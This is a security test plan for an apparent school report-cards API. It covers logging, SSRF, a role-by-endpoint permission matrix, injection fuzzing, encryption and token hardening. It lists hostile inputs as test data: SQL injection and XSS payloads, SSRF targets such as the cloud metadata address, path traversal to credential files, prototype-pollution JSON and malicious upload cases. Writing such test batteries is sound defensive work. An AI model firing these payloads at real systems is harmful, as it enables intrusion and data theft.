### Section 9 — OWASP A09: Security Logging & Monitoring Failures

| #    | Test Name                                | Payload / Scenario                                         | Expected Result                                                     | Severity | Pass/Fail |
| ---- | ---------------------------------------- | ---------------------------------------------------------- | ------------------------------------------------------------------- | -------- | --------- |
| 9.1  | Every mutation writes audit_log          | Test all 85 endpoints — POST/PATCH/DELETE writes audit row | Each creates audit entry with actor, tenant, resource, before/after |          |           |
| 9.2  | Audit log includes IP + UA               | Inspect stored rows                                        | Present                                                             |          |           |
| 9.3  | Audit log cannot be tampered             | Can admin delete audit rows?                               | Append-only; DB policy prevents DELETE                              |          |           |
| 9.4  | Failed auth logged                       | 10 failed logins                                           | Logged to security event stream                                     |          |           |
| 9.5  | Permission denial logged                 | 403s on sensitive endpoints                                | Logged with spike detection                                         |          |           |
| 9.6  | Brute-force on /verify logged            | 1000 /verify attempts                                      | Logged + rate-limited                                               |          |           |
| 9.7  | Delivery channel failure logged (no PII) | Force SMS fail — inspect logs                              | Error logged WITHOUT phone number or comment body                   |          |           |
| 9.8  | Log retention                            | Check log retention policy                                 | ≥ 90 days for audit                                                 |          |           |
| 9.9  | Log shipping                             | Logs reach central aggregator (CloudWatch / Loki)          | Confirmed                                                           |          |           |
| 9.10 | Alerts on anomaly                        | Try 1000 /verify in 1 min → alert fires                    | Alert triggers within 5 min                                         |          |           |
| 9.11 | Snapshot integrity hash                  | Each snapshot has SHA256 stored                            | Verified                                                            |          |           |
| 9.12 | Audit log for signature image upload     | Upload principal signature                                 | Audit row with actor + file hash                                    |          |           |

---

### Section 10 — OWASP A10: Server-Side Request Forgery (SSRF)

| #     | Test Name                                  | Payload / Scenario                                                           | Expected Result                                                                           | Severity | Pass/Fail |
| ----- | ------------------------------------------ | ---------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | -------- | --------- |
| 10.1  | Template-from-image URL input              | If endpoint accepts URL: point to `http://169.254.169.254/latest/meta-data/` | 400 / blocked via allow-list                                                              |          |           |
| 10.2  | Template-from-image URL to localhost       | `http://127.0.0.1:3001/v1/admin`                                             | Blocked                                                                                   |          |           |
| 10.3  | Template-from-image URL to internal subnet | `http://10.0.0.1/`                                                           | Blocked                                                                                   |          |           |
| 10.4  | Template-from-image DNS rebinding          | Hostname that resolves to public first, internal second                      | SSRF guard validates final resolved IP                                                    |          |           |
| 10.5  | AI draft service endpoint override         | Tenant admin sets AI_BASE_URL to `http://internal-vault`                     | Config NOT tenant-overridable; only platform-env                                          |          |           |
| 10.6  | Signed URL S3 bucket name from user        | Body param influences bucket                                                 | 400 — bucket is hard-coded / from env                                                     |          |           |
| 10.7  | Puppeteer opens arbitrary URL              | Can template reference `file:///etc/passwd` or `http://internal`?            | Chrome launched with `--disable-file-system-access`; images loaded only from approved CDN |          |           |
| 10.8  | Image proxy endpoint                       | If there's a proxy/thumbnail endpoint, test loopback                         | Blocked                                                                                   |          |           |
| 10.9  | Webhook outbound                           | If delivery uses outbound webhooks, block internal ranges                    | IP allow-list / deny-list on outbound                                                     |          |           |
| 10.10 | Gopher / dict / file protocols via URL     | `gopher://`, `file://`, `dict://`                                            | Only http/https permitted                                                                 |          |           |

---

## Part 2 — Permission Matrix (Role × Endpoint Grid)

### Section 11 — Summary permission layout

Endpoints fall into 11 permission domains within the Report Cards module:

- `report_cards.runs.view` / `.manage`
- `report_cards.templates.view` / `.manage`
- `report_cards.approvals.configure`
- `report_cards.approvals.act`
- `report_cards.comments.submit`
- `report_cards.comments.manage`
- `report_cards.publish`
- `report_cards.delivery.configure`
- `report_cards.branding.manage`

### Section 12 — Permission Matrix (abbreviated — one row per endpoint group × role)

| Endpoint group                                     | admin  | school_owner | principal | vice_principal | teacher     | parent    | student | anon   |
| -------------------------------------------------- | ------ | ------------ | --------- | -------------- | ----------- | --------- | ------- | ------ |
| GET /v1/report-cards/runs                          | ✓      | ✓            | ✓         | ✓              | own-scope   | —         | —       | 401    |
| POST /v1/report-cards/runs                         | ✓      | ✓            | ✓         | ✓              | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/runs/:id/finalise            | ✓      | ✓            | ✓         | 403            | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/runs/:id/publish             | ✓      | ✓            | ✓         | 403            | 403         | 403       | 403     | 401    |
| DELETE /v1/report-cards/runs/:id                   | ✓      | ✓            | 403       | 403            | 403         | 403       | 403     | 401    |
| GET /v1/report-cards/templates                     | ✓      | ✓            | ✓         | ✓              | view-only   | —         | —       | 401    |
| POST /v1/report-cards/templates                    | ✓      | ✓            | ✓         | 403            | 403         | 403       | 403     | 401    |
| PATCH /v1/report-cards/templates/:id               | ✓      | ✓            | ✓         | 403            | 403         | 403       | 403     | 401    |
| DELETE /v1/report-cards/templates/:id              | ✓      | ✓            | 403       | 403            | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/templates/:id/clone          | ✓      | ✓            | ✓         | 403            | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/templates/from-image         | ✓      | ✓            | ✓         | 403            | 403         | 403       | 403     | 401    |
| GET /v1/report-cards/approval-configs              | ✓      | ✓            | ✓         | ✓              | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/approval-configs             | ✓      | ✓            | 403       | 403            | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/comments                     | view   | view         | view      | view           | ✓ own-class | 403       | 403     | 401    |
| PATCH /v1/report-cards/comments/:id                | ✓      | ✓            | ✓         | ✓              | own-only    | 403       | 403     | 401    |
| DELETE /v1/report-cards/comments/:id               | ✓      | ✓            | ✓         | 403            | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/comments/request             | 403    | 403          | 403       | 403            | ✓           | 403       | 403     | 401    |
| POST /v1/report-cards/comments/request/:id/approve | ✓      | ✓            | ✓         | ✓              | 403         | 403       | 403     | 401    |
| GET /v1/report-cards/:id                           | ✓      | ✓            | ✓         | ✓              | own-class   | own-child | own     | 401    |
| GET /v1/report-cards/:id/pdf                       | ✓      | ✓            | ✓         | ✓              | own-class   | own-child | own     | 401    |
| POST /v1/report-cards/:id/acknowledge              | 403    | 403          | 403       | 403            | 403         | own-child | 403     | 401    |
| POST /v1/report-cards/:id/revise                   | ✓      | ✓            | ✓         | 403            | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/:id/deliver                  | ✓      | ✓            | ✓         | 403            | 403         | 403       | 403     | 401    |
| GET /v1/report-cards/delivery-channels             | ✓      | ✓            | ✓         | ✓              | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/delivery-channels            | ✓      | ✓            | 403       | 403            | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/branding                     | ✓      | ✓            | ✓         | 403            | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/branding/signature           | ✓      | ✓            | ✓         | 403            | 403         | 403       | 403     | 401    |
| POST /v1/report-cards/bulk-import                  | ✓      | ✓            | 403       | 403            | 403         | 403       | 403     | 401    |
| GET /v1/verify/:token                              | public | public       | public    | public         | public      | public    | public  | public |

Every cell must be tested. The grid above expands to ≥ 85 endpoints × 8 roles = 680 test invocations. Scripts should auto-generate these from the OpenAPI definition.

| #           | Test Name                                              | Payload / Scenario                          | Expected Result               | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------ | ------------------------------------------- | ----------------------------- | -------- | --------- |
| 12.1        | Matrix row 1 — teacher POST runs                       | Teacher JWT → POST runs                     | 403                           |          |           |
| 12.2        | Matrix row 2 — parent DELETE template                  | Parent JWT → DELETE template                | 403                           |          |           |
| 12.3        | Matrix row 3 — student POST comment                    | Student JWT → POST comment                  | 403                           |          |           |
| 12.4        | Matrix row 4 — anon verify                             | no JWT → GET /verify/:valid                 | 200                           |          |           |
| 12.5        | Matrix row 5 — anon any authed                         | no JWT → GET runs                           | 401                           |          |           |
| 12.6        | Matrix row 6 — vice_principal publish                  | VP JWT → publish                            | 403                           |          |           |
| 12.7        | Matrix row 7 — principal approval-config create        | Principal JWT → POST approval-configs       | 403 (only admin+owner)        |          |           |
| 12.8        | Matrix row 8 — school_owner bypass                     | Owner JWT → any endpoint in own tenant      | 200                           |          |           |
| 12.9        | Matrix row 9 — school_owner cross-tenant               | Owner A JWT → endpoint on Tenant B resource | 404 — does NOT bypass tenancy |          |           |
| 12.10       | Matrix row 10 — admin bulk-import                      | Admin JWT → POST bulk-import                | 200                           |          |           |
| 12.11-12.60 | Remaining 680 - 10 = 670 cells auto-executed by script | Each matrix cell                            | Match expected                |          |           |

### Section 13 — Role switching attacks

| #    | Test Name                             | Payload / Scenario                                       | Expected Result                                | Severity | Pass/Fail |
| ---- | ------------------------------------- | -------------------------------------------------------- | ---------------------------------------------- | -------- | --------- |
| 13.1 | Edit role claim client-side           | Modify JWT payload `role: "admin"` → call admin endpoint | 401 signature mismatch                         |          |           |
| 13.2 | Add role via query param              | `?as=admin`                                              | Ignored                                        |          |           |
| 13.3 | Add role via header                   | `X-User-Role: admin`                                     | Ignored                                        |          |           |
| 13.4 | Add permission via body               | `{ _permissions: ['report_cards.publish'] }`             | Stripped by Zod / ignored                      |          |           |
| 13.5 | Privilege inheritance via user update | Self-PATCH role on /v1/users/:me                         | 403 — role changes require admin               |          |           |
| 13.6 | Swap tenant_id in request             | `X-Tenant-Id` header                                     | Ignored; tenant resolved from JWT or subdomain |          |           |

### Section 14 — Permission cache race

| #    | Test Name                             | Payload / Scenario                          | Expected Result                                                     | Severity          | Pass/Fail |
| ---- | ------------------------------------- | ------------------------------------------- | ------------------------------------------------------------------- | ----------------- | --------- |
| 14.1 | Revoke permission — cache TTL         | Grant, use, revoke, retry within TTL window | Old permission may still work until TTL expires; document TTL ≤ 60s | P1 if TTL > 5 min |           |
| 14.2 | Grant permission — cache invalidation | Grant new permission, retry                 | Available immediately (cache pushes on grant)                       |                   |           |
| 14.3 | Role deletion while logged in         | Delete role → call endpoint                 | ≤ 60s window tolerated; eventually 403                              |                   |           |
| 14.4 | Tenant disabled while logged in       | Disable tenant → user calls                 | ≤ 60s later; all 403                                                |                   |           |
| 14.5 | Cache poisoning                       | Attempt to inject permission row directly   | No API to do so; DB layer only                                      |                   |           |

### Section 15 — school_owner bypass scope

| #    | Test Name                                             | Payload / Scenario                                                      | Expected Result                        | Severity | Pass/Fail |
| ---- | ----------------------------------------------------- | ----------------------------------------------------------------------- | -------------------------------------- | -------- | --------- |
| 15.1 | Owner calls every report-cards endpoint in own tenant | Owner JWT → all 85 endpoints                                            | 200 / appropriate success              |          |           |
| 15.2 | Owner tries cross-tenant access                       | Owner A JWT → Tenant B endpoint (via explicit B tenant_id in subdomain) | 403 — owner privilege is single-tenant |          |           |
| 15.3 | Owner role creation                                   | Owner promotes another user to admin                                    | 200 (intentional)                      |          |           |
| 15.4 | PermissionCacheService.isOwner() verified             | Read source: does `isOwner()` always scope by tenant_id?                | YES — must assert in test              |          |           |

---

## Part 3 — Injection Fuzz Matrix

### Section 16 — SQL fuzz payload battery

Fuzz payloads applied to EVERY string-typed request field in EVERY mutating endpoint.

| #     | Payload                               | Expected                      | Severity |
| ----- | ------------------------------------- | ----------------------------- | -------- |
| 16.1  | `'; DROP TABLE report_cards;--`       | Literal store OR 400          |          |
| 16.2  | `' OR 1=1--`                          | Literal                       |          |
| 16.3  | `UNION SELECT password FROM users`    | Literal                       |          |
| 16.4  | `' AND SLEEP(5)--`                    | No delay                      |          |
| 16.5  | `" OR ""="`                           | Literal                       |          |
| 16.6  | `admin'--`                            | Literal                       |          |
| 16.7  | `%27%20OR%201%3D1` (URL-encoded)      | 400 or literal after decode   |          |
| 16.8  | Binary smuggle `0x3B44524f50`         | Rejected                      |          |
| 16.9  | Stacked query `1; SELECT pg_sleep(5)` | No delay, rejected or literal |          |
| 16.10 | Postgres-specific `$$ $$`             | Literal                       |          |

| #     | Test Name                                               | Expected Result | Severity | Pass/Fail |
| ----- | ------------------------------------------------------- | --------------- | -------- | --------- |
| 16.11 | Apply all 16.1-16.10 to `name` field on template create | All safe        |          |           |
| 16.12 | Apply all to `comment_text`                             | All safe        |          |           |
| 16.13 | Apply all to `search` query param on runs list          | All safe        |          |           |
| 16.14 | Apply all to `delivery_channel.subject`                 | All safe        |          |           |
| 16.15 | Apply all to custom field string values                 | All safe        |          |           |

### Section 17 — XSS fuzz payload battery

| #     | Payload                                                               | Expected              | Severity |
| ----- | --------------------------------------------------------------------- | --------------------- | -------- |
| 17.1  | `<script>alert(1)</script>`                                           | Escaped               |          |
| 17.2  | `javascript:alert(1)`                                                 | Stripped in hrefs     |          |
| 17.3  | `<img src=x onerror=alert(1)>`                                        | Escaped               |          |
| 17.4  | `<svg/onload=alert(1)>`                                               | Escaped               |          |
| 17.5  | `<iframe src=javascript:...>`                                         | Escaped               |          |
| 17.6  | `"><script>fetch(...)</script>`                                       | Escaped               |          |
| 17.7  | `';!--"<XSS>=&{()}`                                                   | Escaped               |          |
| 17.8  | Unicode `\u003cscript\u003e`                                          | Escaped               |          |
| 17.9  | Null byte `<scr\x00ipt>`                                              | Escaped               |          |
| 17.10 | Mixed case `<ScRiPt>`                                                 | Escaped               |          |
| 17.11 | Polyglot `jaVasCript:/*-/*`/`/*\`/_'/_"/\*_/(/_ \*/oNcliCk=alert() )` | Escaped               |          |
| 17.12 | Data URI `data:text/html;base64,...`                                  | Stripped in hrefs     |          |
| 17.13 | CSS expression `expression(alert(1))`                                 | Stripped              |          |
| 17.14 | HTML entity encoded `&#60;script&#62;`                                | Literal               |          |
| 17.15 | Unicode RTL override `\u202E`                                         | Rendered as codepoint |          |

| #     | Test Name                                           | Expected Result     | Severity | Pass/Fail |
| ----- | --------------------------------------------------- | ------------------- | -------- | --------- |
| 17.16 | Apply all 17.1-17.15 to comment_text on PDF render  | No script execution |          |           |
| 17.17 | Apply all to student name displayed on /verify page | No script execution |          |           |
| 17.18 | Apply all to principal_name on branding             | No script execution |          |           |
| 17.19 | Apply all to template section title                 | No script execution |          |           |
| 17.20 | Apply all to custom field values                    | No script execution |          |           |

### Section 18 — JSON / prototype-pollution battery

| #     | Payload                                           | Expected                                   | Severity |
| ----- | ------------------------------------------------- | ------------------------------------------ | -------- |
| 18.1  | `{"__proto__": {"admin": true}}`                  | Stripped; Object.prototype.admin undefined |          |
| 18.2  | `{"constructor": {"prototype": {"admin": true}}}` | Stripped                                   |          |
| 18.3  | `{"a":{"__proto__":{"x":1}}}` nested              | Stripped                                   |          |
| 18.4  | Oversized nesting (10k depth)                     | 400 (depth limit)                          |          |
| 18.5  | Duplicate keys                                    | Last-wins or rejected                      |          |
| 18.6  | Unicode key `\u0000`                              | Rejected                                   |          |
| 18.7  | BigInt via `1n` marker                            | Rejected                                   |          |
| 18.8  | Invalid UTF-8 sequence                            | 400                                        |          |
| 18.9  | Circular reference (if any serialiser used)       | Rejected                                   |          |
| 18.10 | Mongo-style operator `{"$where":"..."}`           | Zod strict rejects                         |          |

| #     | Test Name                                       | Expected Result | Severity | Pass/Fail |
| ----- | ----------------------------------------------- | --------------- | -------- | --------- |
| 18.11 | Apply 18.1-18.10 to sections_json               | All safe        |          |           |
| 18.12 | Apply to target_scope_json                      | All safe        |          |           |
| 18.13 | Apply to custom_field_values                    | All safe        |          |           |
| 18.14 | Apply to snapshot_payload_json (blocked anyway) | 400 immutable   |          |           |

### Section 19 — Path traversal & filename attacks

| #    | Payload                                     | Expected                             | Severity |
| ---- | ------------------------------------------- | ------------------------------------ | -------- |
| 19.1 | `../../../etc/passwd`                       | Sanitised                            |          |
| 19.2 | `..\\..\\windows\\system32\\config\\sam`    | Sanitised                            |          |
| 19.3 | `%2e%2e%2fetc%2fpasswd` (URL-encoded)       | Sanitised                            |          |
| 19.4 | Null byte `file.png\x00.exe`                | Rejected                             |          |
| 19.5 | Double extension `file.png.exe`             | Extension check rejects              |          |
| 19.6 | Unicode normalisation `ﬁle.png` (ligatures) | Normalised or rejected               |          |
| 19.7 | Long path (2048 chars)                      | Rejected                             |          |
| 19.8 | Reserved name `CON`, `NUL`, `AUX`           | Rejected (if Windows path ever used) |          |

| #     | Test Name                                    | Expected Result | Severity | Pass/Fail |
| ----- | -------------------------------------------- | --------------- | -------- | --------- |
| 19.9  | Apply 19.1-19.8 to signature upload filename | Safe            |          |           |
| 19.10 | Apply to template-from-image upload          | Safe            |          |           |
| 19.11 | Apply to bulk-import filename                | Safe            |          |           |

### Section 20 — Null byte / oversized / unicode

| #     | Test Name                                | Payload / Scenario             | Expected Result              | Severity | Pass/Fail |
| ----- | ---------------------------------------- | ------------------------------ | ---------------------------- | -------- | --------- |
| 20.1  | 1MB string in comment_text               | Repeat `A` 1,048,576 times     | 400 (exceeds max_length)     |          |           |
| 20.2  | 10MB string body                         | Full body                      | 413 Payload Too Large        |          |           |
| 20.3  | Null byte in comment_text                | `foo\x00bar`                   | Stored truncated or rejected |          |           |
| 20.4  | RTL override unicode in student name     | `\u202E`                       | Stored literal; display-safe |          |           |
| 20.5  | Zero-width characters                    | `\u200B`                       | Stored; display stripped     |          |           |
| 20.6  | Homoglyph attack (Cyrillic а vs Latin a) | Tenant name with mixed scripts | Stored; display warning      |          |           |
| 20.7  | Emoji in all fields                      | Full emoji set                 | Accepted; no PDF crash       |          |           |
| 20.8  | Extremely long UUID (64 chars)           | `/v1/report-cards/aaaa...aaaa` | 400 invalid UUID             |          |           |
| 20.9  | UTF-8 4-byte chars in PDF                | Chinese / Arabic names         | Rendered correctly           |          |           |
| 20.10 | Combining characters (Zalgo text)        | `ñ̵̢̧̨̛̛̦̯̰̯͚̘̎͒̍̽̒̈́̕͜͝`                            | Accepted; no crash           |          |           |

### Section 21 — Numeric overflow / negative

| #     | Test Name              | Payload / Scenario          | Expected Result                 | Severity | Pass/Fail |
| ----- | ---------------------- | --------------------------- | ------------------------------- | -------- | --------- |
| 21.1  | Page number negative   | `?page=-1`                  | 400                             |          |           |
| 21.2  | Page number zero       | `?page=0`                   | 400 (page is 1-indexed)         |          |           |
| 21.3  | Page size over max     | `?pageSize=10000`           | 400 (max 100)                   |          |           |
| 21.4  | Page number very large | `?page=999999999`           | 200 empty OR 400                |          |           |
| 21.5  | Float in integer field | `?pageSize=3.14`            | 400                             |          |           |
| 21.6  | Scientific notation    | `?pageSize=1e3`             | 400                             |          |           |
| 21.7  | Hex in integer field   | `?pageSize=0x20`            | 400                             |          |           |
| 21.8  | Negative grade value   | Custom field `grade: -9999` | 400 if grade schema enforces ≥0 |          |           |
| 21.9  | Infinity               | `grade: Infinity`           | 400                             |          |           |
| 21.10 | NaN                    | `grade: NaN`                | 400                             |          |           |

### Section 22 — Invalid UUIDs

| #     | Test Name                  | Payload / Scenario                                            | Expected Result                      | Severity | Pass/Fail |
| ----- | -------------------------- | ------------------------------------------------------------- | ------------------------------------ | -------- | --------- |
| 22.1  | UUID too short             | `/v1/report-cards/abc`                                        | 400                                  |          |           |
| 22.2  | UUID too long              | `/v1/report-cards/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa-extra` | 400                                  |          |           |
| 22.3  | UUID wrong case            | Mixed case                                                    | 200 (UUIDs are case-insensitive)     |          |           |
| 22.4  | UUID with hyphens replaced | `aaaaaaaa_aaaa_aaaa_aaaa_aaaaaaaaaaaa`                        | 400                                  |          |           |
| 22.5  | UUID with non-hex chars    | `ggggggggg-gggg-gggg-gggg-gggggggggggg`                       | 400                                  |          |           |
| 22.6  | UUID v3/v5 instead of v4   | Valid format different version                                | Accepted (format, not version check) |          |           |
| 22.7  | All-zeros UUID             | `00000000-0000-0000-0000-000000000000`                        | 400 or 404                           |          |           |
| 22.8  | URL-encoded UUID           | `%61%61%61...`                                                | Decoded and validated                |          |           |
| 22.9  | UUID as query param        | `?id=abc`                                                     | 400                                  |          |           |
| 22.10 | UUID with SQL suffix       | `aaaa...aaaa' OR '1'='1`                                      | 400 (regex validation blocks)        |          |           |

### Section 23 — Mass assignment

| #     | Test Name                              | Payload / Scenario                                                 | Expected Result                | Severity | Pass/Fail |
| ----- | -------------------------------------- | ------------------------------------------------------------------ | ------------------------------ | -------- | --------- |
| 23.1  | Extra `tenant_id` in body              | POST /runs with `tenant_id: <tenant_b>`                            | Stripped by Zod strict         |          |           |
| 23.2  | Extra `id` in body                     | POST /runs with own chosen UUID                                    | Stripped; server-generated     |          |           |
| 23.3  | Extra `created_at`                     | POST with fake timestamp                                           | Stripped                       |          |           |
| 23.4  | Extra `updated_at`                     | PATCH with fake timestamp                                          | Stripped                       |          |           |
| 23.5  | Extra `status` on create               | POST /runs with `status: 'published'`                              | Stripped; default draft        |          |           |
| 23.6  | Extra `created_by`                     | POST with impersonated actor                                       | Stripped; derived from JWT     |          |           |
| 23.7  | Extra `snapshot_payload_json` on PATCH | PATCH with new snapshot                                            | 400 — immutable                |          |           |
| 23.8  | Extra `is_deleted` toggle              | PATCH with soft-delete flag                                        | Stripped — use DELETE endpoint |          |           |
| 23.9  | Extra permission keys                  | POST `/runs` with `required_permission: 'report_cards.publish'`    | Stripped                       |          |           |
| 23.10 | Zod passthrough vs strict              | Verify all schemas use `.strict()` or `.passthrough()` is explicit | All mutations use `.strict()`  |          |           |

### Section 24 — Business-logic abuse: scope IDs

| #    | Test Name                       | Payload / Scenario                                  | Expected Result                 | Severity | Pass/Fail |
| ---- | ------------------------------- | --------------------------------------------------- | ------------------------------- | -------- | --------- |
| 24.1 | Cross-tenant class_ids in scope | `{"class_ids": ["<tenant_a_class>"]}` from Tenant B | 400 `CROSS_TENANT_SCOPE`        |          |           |
| 24.2 | Mixed own + foreign class       | Partial tenant B + tenant A                         | 400 — rejects the whole payload |          |           |
| 24.3 | Non-existent class IDs          | UUIDs that don't resolve                            | 400                             |          |           |
| 24.4 | Archived class included         | `class_ids` includes archived entity                | 400 `SCOPE_ARCHIVED` or warning |          |           |
| 24.5 | 10,000 class IDs                | Bulk payload                                        | 400 size limit OR queued async  |          |           |
| 24.6 | Empty scope                     | `[]`                                                | 400 `SCOPE_REQUIRED`            |          |           |
| 24.7 | Null scope                      | `null`                                              | 400                             |          |           |

### Section 25 — Business-logic abuse: approvals

| #    | Test Name                                   | Payload / Scenario                 | Expected Result        | Severity | Pass/Fail |
| ---- | ------------------------------------------- | ---------------------------------- | ---------------------- | -------- | --------- |
| 25.1 | Submit with fake approval_config_id         | UUID not in tenant                 | 400                    |          |           |
| 25.2 | Submit with cross-tenant approval_config_id | Tenant A's config from Tenant B    | 404                    |          |           |
| 25.3 | Approve as non-approver user                | User without `approvals.act`       | 403                    |          |           |
| 25.4 | Approve twice                               | Approve already-approved run       | 409 `ALREADY_APPROVED` |          |           |
| 25.5 | Approve a draft                             | Run in draft status                | 409 `INVALID_STATUS`   |          |           |
| 25.6 | Reject with empty reason                    | Reject without comment             | 400 if reason required |          |           |
| 25.7 | Self-approve own submission                 | Same user submits + approves       | 403 if policy forbids  |          |           |
| 25.8 | Parallel approver race                      | Two approvers approve same instant | First wins, second 409 |          |           |

### Section 26 — Business-logic abuse: signature / file upload

| #     | Test Name                                 | Payload / Scenario           | Expected Result                                     | Severity | Pass/Fail |
| ----- | ----------------------------------------- | ---------------------------- | --------------------------------------------------- | -------- | --------- |
| 26.1  | Upload executable as signature            | `sig.exe` renamed to `.png`  | Magic-byte rejected                                 |          |           |
| 26.2  | Upload large file                         | 50MB signature               | 400 / 413                                           |          |           |
| 26.3  | Upload PHP script with image extension    | `sig.png.php`                | Rejected                                            |          |           |
| 26.4  | Upload SVG with script                    | `<svg><script>...`           | Script stripped OR converted to raster              |          |           |
| 26.5  | Upload image with EXIF GPS                | Check if stripped            | GPS stripped before store                           |          |           |
| 26.6  | Upload polyglot (PNG + HTML)              | Valid PNG header + HTML body | Stored but served with correct Content-Type; no XSS |          |           |
| 26.7  | Upload file with exec bit (tar preserves) | tar with exec bit            | Bit stripped on store                               |          |           |
| 26.8  | Zip bomb in bulk-import                   | 42KB → 4GB                   | Size-on-extract limit triggers                      |          |           |
| 26.9  | PDF / Office doc as signature             | Non-image file               | Rejected                                            |          |           |
| 26.10 | Animated GIF as signature                 | GIF with many frames         | Accepted / rendered as first frame                  |          |           |

### Section 27 — Business-logic abuse: acknowledgment IDOR (P0 candidate)

| #    | Test Name                                              | Payload / Scenario                               | Expected Result                             | Severity            | Pass/Fail |
| ---- | ------------------------------------------------------ | ------------------------------------------------ | ------------------------------------------- | ------------------- | --------- |
| 27.1 | POST /acknowledge with body `parent_id = other parent` | Parent A authenticates → body specifies Parent B | Server MUST use JWT parent_id; body IGNORED | **P0** if body wins |           |
| 27.2 | POST /acknowledge with body `acknowledged_by`          | Parent A → body says it was the other parent     | Derived from JWT                            | P0 if body wins     |           |
| 27.3 | POST /acknowledge with body `acknowledged_at`          | Parent A sends future timestamp                  | Server overrides with now()                 |                     |           |
| 27.4 | POST /acknowledge twice from same parent               | Second call                                      | 200 idempotent                              |                     |           |
| 27.5 | POST /acknowledge on unpublished card                  | Status draft                                     | 409                                         |                     |           |
| 27.6 | POST /acknowledge on another household child           | Parent A's child ≠ card student                  | 403                                         |                     |           |
| 27.7 | GET /acknowledgments by parent_id                      | Parent A queries for all ack                     | Scoped to own household only                |                     |           |

---

## Part 4 — Encrypted-Field Round-Trip

### Section 28 — Encrypted field inventory

| #     | Test Name                             | Payload / Scenario                        | Expected Result                              | Severity | Pass/Fail |
| ----- | ------------------------------------- | ----------------------------------------- | -------------------------------------------- | -------- | --------- |
| 28.1  | Grep Prisma schema for `@@encrypted`  | Find all report-cards encrypted columns   | Documented list; expected empty if none      |          |           |
| 28.2  | Principal signature S3 object         | Inspect `x-amz-server-side-encryption`    | SSE-S3 or SSE-KMS                            |          |           |
| 28.3  | PDF S3 object                         | Same                                      | SSE-S3 or SSE-KMS                            |          |           |
| 28.4  | JWT secrets at rest                   | AWS Secrets Manager / SSM Parameter Store | Encrypted                                    |          |           |
| 28.5  | Verification token round trip         | Insert, select, compare                   | Matches                                      |          |           |
| 28.6  | Pre-signed URL signature uses KMS key | Inspect IAM policy                        | IAM role has KMS decrypt                     |          |           |
| 28.7  | Plaintext leak in logs                | Grep logs for signed URL query strings    | Pre-signed URL content not logged in full    |          |           |
| 28.8  | Plaintext leak in audit rows          | Check audit_log for signature URLs        | Stored with URL, but PII inside JSONB masked |          |           |
| 28.9  | Encryption algorithm                  | Confirm AES-256 for app-layer (if used)   | Yes                                          |          |           |
| 28.10 | IV / nonce uniqueness                 | Sample 100 encrypted rows                 | No IV reuse                                  |          |           |

### Section 29 — Key rotation

| #    | Test Name                         | Payload / Scenario                                   | Expected Result                           | Severity | Pass/Fail |
| ---- | --------------------------------- | ---------------------------------------------------- | ----------------------------------------- | -------- | --------- |
| 29.1 | Rotate KMS key                    | Trigger rotation; existing objects still decryptable | Yes (KMS aliasing)                        |          |           |
| 29.2 | JWT signing key rotation          | Rotate; old tokens accepted until TTL                | Graceful rollover                         |          |           |
| 29.3 | App-layer encryption key rotation | N/A if no app-layer fields; document                 | —                                         |          |           |
| 29.4 | Emergency key revocation          | Revoke KMS key                                       | All new decrypts fail; documented runbook |          |           |
| 29.5 | Rotation audit trail              | Rotation event logged                                | Yes                                       |          |           |

---

## Part 5 — Authentication Hardening

### Section 30 — Verification token entropy

| #    | Test Name                | Payload / Scenario                              | Expected Result      | Severity | Pass/Fail |
| ---- | ------------------------ | ----------------------------------------------- | -------------------- | -------- | --------- |
| 30.1 | Token length             | ≥ 32 chars (128-bit)                            | Yes                  |          |           |
| 30.2 | Token character set      | base62 / base64url / hex                        | Not user-predictable |          |           |
| 30.3 | Generator function       | `crypto.randomBytes()` or `crypto.randomUUID()` | Crypto-secure        |          |           |
| 30.4 | 10,000 tokens chi-square | Uniform distribution                            | p > 0.05             |          |           |
| 30.5 | Collision rate           | None in 1M generation run                       | 0                    |          |           |
| 30.6 | Token prefix leakage     | No timestamp / tenant hint                      | None                 |          |           |
| 30.7 | Low-byte birthday bound  | ≥ 2^64 search space per tenant                  | Yes                  |          |           |

### Section 31 — Verification token TTL

| #    | Test Name                   | Payload / Scenario                              | Expected Result                          | Severity     | Pass/Fail |
| ---- | --------------------------- | ----------------------------------------------- | ---------------------------------------- | ------------ | --------- |
| 31.1 | Does token have TTL?        | Issue, wait, reuse                              | If no TTL → **P1** document risk         | P1 if no TTL |           |
| 31.2 | TTL policy documented       | Business policy                                 | Explicit: e.g., 1-year or until revision |              |           |
| 31.3 | Token after card revision   | Old token points to old snapshot OR invalidated | Policy: documented                       |              |           |
| 31.4 | Token after card deletion   | 404 on subsequent verify                        | Yes                                      |              |           |
| 31.5 | Token after tenant deletion | 404                                             | Yes                                      |              |           |
| 31.6 | Token after student archive | Still valid OR invalidated                      | Policy documented                        |              |           |
| 31.7 | Sliding expiry              | TTL does NOT slide on each verify               | Expiry fixed at issuance                 |              |           |

### Section 32 — Verification token revocation

| #    | Test Name                             | Payload / Scenario                       | Expected Result                                            | Severity | Pass/Fail |
| ---- | ------------------------------------- | ---------------------------------------- | ---------------------------------------------------------- | -------- | --------- |
| 32.1 | Delete card invalidates token         | DELETE → verify                          | 404                                                        |          |           |
| 32.2 | Revise card invalidates old token     | Revise → verify with old token           | Policy: document (either invalidate or direct to revision) |          |           |
| 32.3 | Archive tenant invalidates all tokens | Archive → any token verify               | 404                                                        |          |           |
| 32.4 | Explicit revoke API exists            | POST `/v1/report-cards/:id/revoke-token` | Exists or N/A — document                                   |          |           |

### Section 33 — Rate limiting on /verify

| #    | Test Name                    | Payload / Scenario         | Expected Result                         | Severity       | Pass/Fail |
| ---- | ---------------------------- | -------------------------- | --------------------------------------- | -------------- | --------- |
| 33.1 | 100 req/s from one IP        | Sustained                  | ≥429 after threshold                    |                |           |
| 33.2 | 10,000 req/hr per IP         | Across day                 | Rate-limited                            |                |           |
| 33.3 | Per-token rate limit         | 100 verifies of same token | Allowed (legitimate parents share link) |                |           |
